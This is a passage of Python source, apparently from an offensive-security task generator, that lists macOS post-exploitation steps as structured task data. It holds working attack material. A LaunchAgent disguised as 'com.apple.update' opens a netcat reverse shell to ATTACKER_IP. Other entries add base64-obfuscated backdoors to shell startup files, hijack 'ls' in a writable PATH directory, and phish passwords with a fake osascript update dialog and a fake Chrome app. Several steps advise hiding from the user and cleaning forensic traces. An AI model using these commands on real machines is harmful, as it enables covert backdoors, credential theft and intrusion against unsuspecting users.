                        'failure_indicators': [
                            'User denies access',
                            'Keychain locked',
                            'Network not saved'
                        ],
                        'next_steps': [
                            'Document all WiFi credentials',
                            'Identify corporate WiFi networks',
                            'Test credentials on other networks',
                            'Check for WPA2-Enterprise configs'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'estimated_time': '1-2 minutes',
                        'notes': 'User prompt appears. Useful for lateral movement to other network segments. Corporate WiFi often uses same PSK across locations.'
                    }
                },
                {
                    'id': 'macos-browser-artifacts',
                    'name': 'Search Browser Artifacts',
                    'type': 'command',
                    'metadata': {
                        'command': 'find ~/Library/Application\\ Support -type f \\( -name "Cookies.binarycookies" -o -name "History.db" -o -name "Login\\ Data" -o -name "Bookmarks" \\) 2>/dev/null',
                        'description': 'Locate browser database files (Safari, Chrome, Firefox) containing credentials and history',
                        'flag_explanations': {
                            '~/Library/Application Support': 'macOS application data directory',
                            'Cookies.binarycookies': 'Safari cookies (binary format)',
                            'History.db': 'Browser history database',
                            'Login Data': 'Chrome saved passwords (encrypted)',
                            'Bookmarks': 'Browser bookmarks (may reveal infrastructure)'
                        },
                        'success_indicators': [
                            'Browser database files found',
                            'Multiple browsers detected',
                            'Paths to sensitive data revealed'
                        ],
                        'failure_indicators': [
                            'No browsers installed',
                            'Databases empty',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Extract cookies: security find-internet-password -g',
                            'Dump history: sqlite3 ~/Library/Safari/History.db "SELECT url, title FROM history_items LIMIT 100;"',
                            'Chrome passwords: Encrypted with keychain, need user password',
                            'Look for admin panels in bookmarks/history'
                        ],
                        'alternatives': [
                            'Manual Safari: ~/Library/Safari/',
                            'Manual Chrome: ~/Library/Application Support/Google/Chrome/Default/',
                            'Manual Firefox: ~/Library/Application Support/Firefox/Profiles/'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ENUM'],
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'macos-downloads-folder',
                    'name': 'Enumerate Downloads Folder',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -lah ~/Downloads | head -50',
                        'description': 'List recent downloads for sensitive files, scripts, credentials',
                        'flag_explanations': {
                            'ls -lah': 'List all files with human-readable sizes and hidden files',
                            '~/Downloads': 'User downloads directory',
                            'head -50': 'Show first 50 entries'
                        },
                        'success_indicators': [
                            'List of downloaded files',
                            'Recent files visible',
                            'File sizes and dates shown'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Downloads folder empty',
                            'Directory does not exist'
                        ],
                        'next_steps': [
                            'Look for: .key, .pem, .p12, .jks (certificates/keys)',
                            'Search for database dumps: .sql, .db',
                            'Find configuration files: .conf, .cfg, .env',
                            'Check for backup files: .bak, .zip, .tar.gz'
                        ],
                        'alternatives': [
                            'find ~/Downloads -type f -mtime -7',
                            'ls -lt ~/Downloads (sort by modification time)',
                            'grep -r "password" ~/Downloads/'
                        ],
                        'tags': ['QUICK_WIN', 'OSCP:MEDIUM', 'ENUM'],
                        'estimated_time': '5 seconds'
                    }
                },
                {
                    'id': 'macos-config-files',
                    'name': 'Search for Configuration Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find ~ -type f \\( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" -o -name "config.json" \\) 2>/dev/null | head -50',
                        'description': 'Locate configuration files that may contain credentials or sensitive settings',
                        'flag_explanations': {
                            'find ~': 'Search user home directory',
                            '*.conf, *.cfg, *.ini': 'Common config file extensions',
                            '.env': 'Environment variable files (often contain API keys)',
                            'config.json': 'JSON configuration files'
                        },
                        'success_indicators': [
                            'Configuration files found',
                            'Application configs identified',
                            'Potential credential files located'
                        ],
                        'failure_indicators': [
                            'No config files found',
                            'All paths permission denied'
                        ],
                        'next_steps': [
                            'Read each file: cat <path>',
                            'Search for passwords: grep -i "password" <file>',
                            'Look for database connections',
                            'Find API keys and tokens',
                            'Check for hardcoded credentials'
                        ],
                        'alternatives': [
                            'find ~ -name ".aws" -o -name ".ssh" -o -name ".docker"',
                            'grep -r "password" ~/. 2>/dev/null',
                            'locate .env | grep -v node_modules'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'SENSITIVE'],
                        'estimated_time': '15 seconds',
                        'notes': 'Check: .aws/credentials, .docker/config.json, .npmrc, .pypirc, .m2/settings.xml for cloud/package manager creds.'
                    }
                }
            ]
        }

    def _create_persistence_mechanisms(self) -> Dict[str, Any]:
        """Persistence and auto-start mechanisms"""
        return {
            'id': 'macos-persistence',
            'name': 'Persistence Mechanisms',
            'type': 'parent',
            'children': [
                {
                    'id': 'macos-launchagents-enum',
                    'name': 'Enumerate LaunchAgents',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" 2>/dev/null',
                        'description': 'List all LaunchAgent plists (user-level auto-start)',
                        'flag_explanations': {
                            '/Library/LaunchAgents': 'System-wide LaunchAgents (requires admin)',
                            '~/Library/LaunchAgents': 'User-specific LaunchAgents (user writable)',
                            '*.plist': 'Property list files defining auto-start tasks'
                        },
                        'success_indicators': [
                            'List of plist files',
                            'User and system LaunchAgents found',
                            'Writable plists identified'
                        ],
                        'failure_indicators': [
                            'No LaunchAgents found',
                            'Permission denied on system folder'
                        ],
                        'next_steps': [
                            'Check for writable plists: ls -la ~/Library/LaunchAgents/',
                            'Examine existing agents for modification opportunities',
                            'Create new LaunchAgent for persistence',
                            'Identify agents running as root'
                        ],
                        'alternatives': [
                            'launchctl list | grep -v "^-"',
                            'ls -la /System/Library/LaunchAgents',
                            'ls -la /Library/LaunchDaemons (system daemons, root only)'
                        ],
                        'tags': ['OSCP:HIGH', 'ENUM', 'PERSISTENCE'],
                        'estimated_time': '5 seconds'
                    }
                },
                {
                    'id': 'macos-create-launchagent',
                    'name': 'Create Persistence LaunchAgent',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create malicious LaunchAgent for persistent backdoor (user-level)',
                        'alternatives': [
                            'Example plist in task notes',
                            'Save to: ~/Library/LaunchAgents/com.apple.update.plist',
                            'Load: launchctl load ~/Library/LaunchAgents/com.apple.update.plist',
                            'Triggers: At login (RunAtLoad), every 800 seconds, or on KeepAlive',
                            'Unload: launchctl unload <path>'
                        ],
                        'success_indicators': [
                            'Plist created successfully',
                            'Agent loaded with launchctl',
                            'Process running after login',
                            'Persistence survives reboot'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Plist format invalid',
                            'Agent fails to load'
                        ],
                        'next_steps': [
                            'Verify execution: launchctl list | grep com.apple.update',
                            'Check logs: cat /var/log/system.log | grep launchd',
                            'Test persistence: log out and back in',
                            'Combine with other persistence methods'
                        ],
                        'tags': ['OSCP:HIGH', 'PERSISTENCE', 'PRIVESC'],
                        'estimated_time': '3-5 minutes',
                        'notes': '''
Example LaunchAgent plist:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>nc -e /bin/bash ATTACKER_IP 4444</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>

Save to: ~/Library/LaunchAgents/com.apple.update.plist
Load: launchctl load ~/Library/LaunchAgents/com.apple.update.plist
Trigger: Immediate + reboot persistence
                        '''
                    }
                },
                {
                    'id': 'macos-shell-persistence',
                    'name': 'Shell Startup Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Add backdoor to shell startup files (.zshrc, .bashrc) for persistence',
                        'alternatives': [
                            'echo "backdoor_command" >> ~/.zshrc',
                            'echo "backdoor_command" >> ~/.zlogin',
                            'echo "backdoor_command" >> ~/.zshenv',
                            'Bash: echo "backdoor_command" >> ~/.bashrc',
                            'System-wide (root): /etc/zshenv, /etc/zprofile'
                        ],
                        'success_indicators': [
                            'Command added to startup file',
                            'Executes on new terminal',
                            'Persistence across logins'
                        ],
                        'failure_indicators': [
                            'File not loaded by shell',
                            'Syntax error breaks shell',
                            'User notices backdoor'
                        ],
                        'next_steps': [
                            'Test: Open new terminal and verify execution',
                            'Make stealthy: Hide in long config file',
                            'Use obfuscation: base64 encode command',
                            'Combine with other persistence methods'
                        ],
                        'tags': ['OSCP:HIGH', 'PERSISTENCE', 'STEALTH'],
                        'estimated_time': '1-2 minutes',
                        'notes': r'''
Stealth example:
echo "export PATH=/tmp/.hidden:\$PATH" >> ~/.zshrc
Place backdoor in /tmp/.hidden/common_command

Obfuscated example:
echo "echo BASE64_PAYLOAD | base64 -d | bash" >> ~/.zshrc

Locations:
~/.zshrc (default macOS shell)
~/.zlogin (login shells)
~/.zshenv (all zsh instances)
/etc/zshenv (system-wide, needs root)
                        '''
                    }
                },
                {
                    'id': 'macos-cron-persistence',
                    'name': 'Cron Job Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create cron job for periodic backdoor execution',
                        'alternatives': [
                            'List current: crontab -l',
                            'Edit: crontab -e',
                            'Example: */5 * * * * /path/to/backdoor.sh (every 5 min)',
                            'System cron (root): /etc/crontab, /etc/cron.d/'
                        ],
                        'success_indicators': [
                            'Cron job created',
                            'Backdoor executes on schedule',
                            'No errors in cron logs'
                        ],
                        'failure_indicators': [
                            'Cron not running',
                            'Full Disk Access required for cron (macOS Catalina+)',
                            'Job fails silently'
                        ],
                        'next_steps': [
                            'Verify execution: check output file or network connection',
                            'Check cron logs: log show --predicate \'process == "cron"\' --last 1h',
                            'Grant cron FDA if needed (TCC bypass)',
                            'Use launchd instead (more reliable on modern macOS)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE'],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Cron requires Full Disk Access on macOS 10.15+. LaunchAgents are preferred. Cron syntax: minute hour day month weekday command'
                    }
                },
                {
                    'id': 'macos-login-hook',
                    'name': 'Login Hook Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create login hook script (executes at user login)',
                        'alternatives': [
                            'Create script: /path/to/hook.sh',
                            'Set hook: sudo defaults write com.apple.loginwindow LoginHook /path/to/hook.sh',
                            'Check current: sudo defaults read com.apple.loginwindow LoginHook',
                            'Remove: sudo defaults delete com.apple.loginwindow LoginHook'
                        ],
                        'success_indicators': [
                            'Login hook set successfully',
                            'Script executes at login',
                            'Persistence active'
                        ],
                        'failure_indicators': [
                            'Requires root access',
                            'Hook script has errors',
                            'Execution blocked by security'
                        ],
                        'next_steps': [
                            'Test: Log out and log back in',
                            'Check logs: /var/log/system.log',
                            'Make script stealthy',
                            'Combine with other methods'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'REQUIRES_ROOT'],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Requires root. Deprecated but still works. LaunchAgents preferred. Script must be executable (chmod +x).'
                    }
                }
            ]
        }

    def _create_user_interaction_attacks(self) -> Dict[str, Any]:
        """User interaction and social engineering attacks"""
        return {
            'id': 'macos-user-interaction',
            'name': 'User Interaction Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': 'macos-sudo-hijack',
                    'name': 'Sudo Hijacking via PATH',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Hijack common commands in PATH to capture sudo password when victim runs sudo',
                        'alternatives': [
                            'Create fake ls: cat > /opt/homebrew/bin/ls <<EOF',
                            'Hijack script captures password when run with sudo',
                            'Victim runs: sudo ls',
                            'Password captured to file',
                            'Original command executes (victim unaware)'
                        ],
                        'success_indicators': [
                            'Fake binary created in PATH',
                            'Victim executes sudo command',
                            'Password captured to file',
                            'Original command executes normally'
                        ],
                        'failure_indicators': [
                            'PATH not hijackable',
                            'Victim notices fake command',
                            'Binary not executed'
                        ],
                        'next_steps': [
                            'Read captured password: cat /tmp/captured_password',
                            'Use for privilege escalation: sudo -i',
                            'Clean up fake binary',
                            'Test password on other accounts'
                        ],
                        'tags': ['OSCP:HIGH', 'USER_INTERACTION', 'PRIVESC'],
                        'estimated_time': '5-10 minutes',
                        'notes': '''
Example sudo hijacking:
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/sudo_captured
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

macOS preserves PATH with sudo (unlike Linux), making this attack effective.
Target: /opt/homebrew/bin (common in user PATH, writable without root)
                        '''
                    }
                },
                {
                    'id': 'macos-dock-impersonation',
                    'name': 'Dock Application Impersonation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create fake application in Dock to steal credentials via phishing prompt',
                        'alternatives': [
                            'Impersonate Chrome, Safari, Finder, etc.',
                            'Create fake .app bundle with legitimate icon',
                            'Add to Dock: defaults write com.apple.dock persistent-apps -array-add',
                            'App displays password prompt when opened',
                            'User enters password thinking it is legitimate app'
                        ],
                        'success_indicators': [
                            'Fake app created',
                            'App added to Dock',
                            'User clicks and enters password',
                            'Credentials captured'
                        ],
                        'failure_indicators': [
                            'User recognizes fake app',
                            'Icon/behavior looks suspicious',
                            'User denies password'
                        ],
                        'next_steps': [
                            'Read captured credentials',
                            'Use for privilege escalation',
                            'Remove fake app from Dock',
                            'Clean forensic traces'
                        ],
                        'tags': ['OSCP:MEDIUM', 'USER_INTERACTION', 'SOCIAL_ENGINEERING'],
                        'estimated_time': '10-15 minutes',
                        'notes': '''
Full example in HackTricks source:
1. Create /tmp/Google Chrome.app structure
2. Copy real Chrome icon
3. Create Info.plist with correct bundle ID
4. Payload uses osascript to show password dialog
5. Password saved to /tmp/passwd.txt
6. Real Chrome opens to avoid suspicion

Targeted apps: Chrome, Finder, System Preferences
Social engineering: "Update required" or "Enter password to continue"
                        '''
                    }
                },
                {
                    'id': 'macos-fake-update-prompt',
                    'name': 'Fake Update/Auth Prompt (osascript)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Display convincing password prompt using osascript (AppleScript)',
                        'alternatives': [
                            'Simple prompt: osascript -e \'tell app "System Preferences" to activate\' -e \'tell app "System Preferences" to display dialog "Enter password:" default answer "" with hidden answer\'',
                            'Styled prompt with icon',
                            'Fake software update dialog',
                            'Security warning prompt'
                        ],
                        'success_indicators': [
                            'Prompt displays convincingly',
                            'User enters password',
                            'Credential captured',
                            'No errors shown'
                        ],
                        'failure_indicators': [
                            'User cancels prompt',
                            'Dialog looks fake',
                            'User reports to security'
                        ],
                        'next_steps': [
                            'Extract entered password from osascript output',
                            'Verify credential validity',
                            'Use for privilege escalation',
                            'Clean up evidence'
                        ],
                        'tags': ['OSCP:MEDIUM', 'USER_INTERACTION', 'SOCIAL_ENGINEERING'],
                        'estimated_time': '5 minutes',
                        'notes': '''
Example osascript password phishing:
PASSWORD=$(osascript -e 'Tell application "System Preferences"
Activate
set userPassword to text returned of (display dialog "System update required. Enter your password:" default answer "" with hidden answer buttons {"OK"} default button 1 with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:LockedIcon.icns")
end tell
return userPassword')
echo $PASSWORD > /tmp/phished_password.txt

Dialogs can include app icons for authenticity.
Users often comply with "security" or "update" prompts.
                        '''
                    }
                }
            ]
        }

    def _create_application_abuse(self) -> Dict[str, Any]:
        """Application preference and configuration abuse"""
        return {
            'id': 'macos-app-abuse',
            'name': 'Application Abuse & Configuration',
            'type': 'parent',
            'children': [
                {
                    'id': 'macos-terminal-startup',
                    'name': 'Terminal Startup Command Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Modify Terminal.app preferences to execute command on startup',
                        'alternatives': [
                            'Set startup command: /usr/libexec/PlistBuddy -c "Set :\\"Window Settings\\":\\"Basic\\":\\"CommandString\\" \'malicious_command\'" ~/Library/Preferences/com.apple.Terminal.plist',
                            'Disable shell mode: /usr/libexec/PlistBuddy -c "Set :\\"Window Settings\\":\\"Basic\\":\\"RunCommandAsShell\\" 0" ~/Library/Preferences/com.apple.Terminal.plist',
                            'Trigger: open -a Terminal',
                            'Command executes with Terminal TCC permissions'
                        ],
                        'success_indicators': [
                            'Plist modified successfully',
                            'Terminal opens and executes command',
                            'Command runs with Terminal privileges'
                        ],
                        'failure_indicators': [
                            'Plist corrupted',
                            'Terminal doesn\'t execute command',
                            'User notices malicious activity'
                        ],
                        'next_steps': [
                            'If Terminal has FDA: Access sensitive files',
                            'Exfiltrate data via Terminal permissions',
                            'Establish persistence',
                            'Restore original plist after attack'
                        ],
                        'tags': ['OSCP:HIGH', 'APP_ABUSE', 'TCC'],
                        'estimated_time': '2 minutes',
                        'notes': 'Terminal.app often has FDA. Command visible in Terminal window. User may notice. Restore with: PlistBuddy -c "Set :...CommandString \'\'" ...'
                    }
                },
                {
                    'id': 'macos-reopened-apps',
                    'name': 'Reopen Applications Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Add malicious app to list of applications that reopen after logout/reboot',
                        'alternatives': [
                            'Get UUID: ioreg -rd1 -c IOPlatformExpertDevice | awk -F\\" \'/IOPlatformUUID/{print $4}\'',
                            'Add app to reopen list: /usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" ...',
                            'Location: ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist',
                            'Triggers on restart with "Reopen windows when logging back in" enabled'
                        ],
                        'success_indicators': [
                            'App added to plist',
                            'App reopens after logout/login',
                            'Persistence established'
                        ],
                        'failure_indicators': [
                            'User disables "Reopen windows"',
                            'App not in running state when logout occurs',
                            'Plist modification fails'
                        ],
                        'next_steps': [
                            'Verify: plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist',
                            'Test: Logout and login',
                            'Ensure app was running before logout',
                            'Combine with other persistence'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'APP_ABUSE'],
                        'estimated_time': '3-5 minutes',
                        'notes': 'Requires app to be running when logout/restart occurs. User must have "Reopen windows" enabled (System Preferences > General). Not 100% reliable.'
                    }
                },
                {
                    'id': 'macos-file-extensions',
                    'name': 'File Extension Handler Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Register malicious application as handler for file extensions or URL schemes',
                        'alternatives': [
                            'List current handlers: /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump',
                            'Create .app with LSHandlerURLSchemes in Info.plist',
                            'Register handler for: .txt, .pdf, http://, custom://',
                            'When user opens file/URL, malicious app executes'
                        ],
                        'success_indicators': [
                            'Handler registered',
                            'App launches when file type opened',
                            'Malicious code executes',
                            'User sees expected behavior (app opens file)'
                        ],
                        'failure_indicators': [
                            'Handler registration fails',
                            'System prompts user to choose app',
                            'Default handler not overridden'
                        ],
                        'next_steps': [
                            'Verify handler: duti -x <extension>',
                            'Create convincing app that actually handles file type',
                            'Backdoor executes then opens file in legitimate app',
                            'Monitor for user file opens'
                        ],
                        'tags': ['OSCP:LOW', 'PERSISTENCE', 'ADVANCED'],
                        'estimated_time': '15-30 minutes',
                        'notes': 'Complex attack. Requires creating convincing .app bundle. User may be prompted to choose handler. Best for targeted attacks on specific file types.'
                    }
                }
            ]
        }

    def _create_exploit_research(self, product: str, version: str, port: int) -> Dict[str, Any]:
        """Create exploit research task with version info"""
        search_term = f"macOS {version}"

        return {
            'id': f'macos-exploit-research-{port}',
            'name': f'macOS Exploit Research: {version}',
            'type': 'parent',
            'children': [
                {
                    'id': f'macos-searchsploit-{port}',
                    'name': f'SearchSploit: macOS {version}',
                    'type': 'command',
                    'metadata': {
                        'command': f'searchsploit "macOS {version}"',
                        'description': f'Search ExploitDB for macOS {version} exploits',
                        'flag_explanations': {
                            'searchsploit': 'Search ExploitDB database offline',
                            f'"macOS {version}"': 'Search term including version number'
                        },
                        'success_indicators': [
                            'Exploits found for this version',
                            'Privilege escalation exploits listed',
                            'TCC bypass techniques available'
                        ],
                        'failure_indicators': [
                            'No exploits found',
                            'Version too new',
                            'searchsploit not installed'
                        ],
                        'next_steps': [
                            'Copy exploit: searchsploit -m <EDB-ID>',
                            'Read exploit source code',
                            'Check exploit prerequisites',
                            'Test in safe environment',
                            'Research CVE details online'
                        ],
                        'alternatives': [
                            f'Google: "macOS {version} privilege escalation"',
                            f'GitHub: search for "macOS {version} exploit"',
                            'Check: https://www.cvedetails.com/product/156/Apple-Mac-Os-X.html'
                        ],
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'EXPLOIT'],
                        'estimated_time': '2-5 minutes'
                    }
                },
                {
                    'id': f'macos-cve-lookup-{port}',
                    'name': f'CVE Lookup: macOS {version}',
                    'type': 'research',
                    'metadata': {
                        'description': f'Research known CVEs for macOS {version}',
                        'alternatives': [
                            f'https://www.cvedetails.com/product/156/Apple-Mac-Os-X.html?vendor_id=49',
                            f'Search: "macOS {version} CVE"',
                            'NVD: https://nvd.nist.gov/',
                            'Apple Security Updates: https://support.apple.com/en-us/HT201222'
                        ],
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Focus on: privilege escalation, TCC bypass, SIP bypass, kernel exploits. Check patch level: sw_vers -buildVersion'
                    }
                },
                {
                    'id': f'macos-github-exploits-{port}',
                    'name': 'GitHub Exploit Search',
                    'type': 'research',
                    'metadata': {
                        'description': f'Search GitHub for macOS {version} exploits and PoCs',
                        'alternatives': [
                            f'https://github.com/search?q=macOS+{version}+exploit',
                            f'https://github.com/topics/macos-exploit',
                            'Search: "macOS privilege escalation github"',
                            'Check: https://github.com/topics/tcc-bypass'
                        ],
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Look for: TCC bypass scripts, SIP bypasses, kernel exploits, automation tools (LinEnum for macOS)'
                    }
                }
            ]
        }
